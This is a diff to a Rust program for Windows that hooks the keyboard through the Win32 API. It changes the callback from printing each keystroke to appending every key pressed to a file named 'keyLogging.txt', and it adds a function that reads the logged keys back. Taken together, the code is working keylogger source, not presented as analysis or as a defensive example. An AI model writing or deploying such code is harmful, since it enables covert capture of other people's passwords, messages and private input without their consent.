@@ -1,3 +1,5 @@
+use std::fs::{self, OpenOptions};
+use std::io::Write;
 
 use windows::Win32::Foundation::{
     HWND, LPARAM, LRESULT, WPARAM
@@ -107,25 +109,23 @@ unsafe extern "system" fn keyboard_callback(code: i32, wparam: WPARAM, lparam: L
 
         println!("Key event: vkCode = {}, wParam = {}", vk_code, wparam.0);
 
-        match vk_code {
-            8 => {println!("[BACKSPACE]");}
-            9 => {println!("[TAB]");}
-            13 => {println!("[ENTER]");}
-            20 => {println!("[CAP]");}
-            27 => {println!("[ESC]");}
-            92 => {println!("[WIN]");}
-            160 => {println!("[L-SHIFT]");}
-            161 => {println!("[R-SHIFT]");}
-            162 => {println!("[L-CTRL]");}
-            163  => {println!("[R-CTRL]");}
-            _ =>{
-                println!("Key pressed: '{}'", vk_code_to_char(vk_code).unwrap());
-            }
-        }
+        let key_pressed = match vk_code {
+            8 => {"[BACKSPACE]"}
+            9 => {"[TAB]"}
+            13 => {"[ENTER]"}
+            20 => {"[CAP]"}
+            27 => {"[ESC]"}
+            92 => {"[WIN]"}
+            160 => {"[L-SHIFT]"}
+            161 => {"[R-SHIFT]"}
+            162 => {"[L-CTRL]"}
+            163  => {"[R-CTRL]"}
+            _ => &vk_code_to_char(vk_code).unwrap().to_string()
+            
+        };
 
-        
-        
-        
+        write_into_file(&key_pressed);
+
     }
 
     CallNextHookEx(None, code, wparam, lparam)
@@ -157,4 +157,22 @@ unsafe fn vk_code_to_char(vk_code:u32) -> Option<char>{
     
 
     char::from_u32(char_buf[0] as u32)
+}
+
+
+fn write_into_file(button_pressed:& str){
+
+    let mut data_file = OpenOptions::new()
+    .create(true)
+    .append(true).
+    open("keyLogging.txt").expect("Cannot open file");
+    
+
+    data_file.write(button_pressed.as_bytes()).expect("Failed"); 
+}
+
+pub fn read_file() -> String{
+
+     fs::read_to_string("keyLogging.txt")
+    .expect("can't read into file")
 }
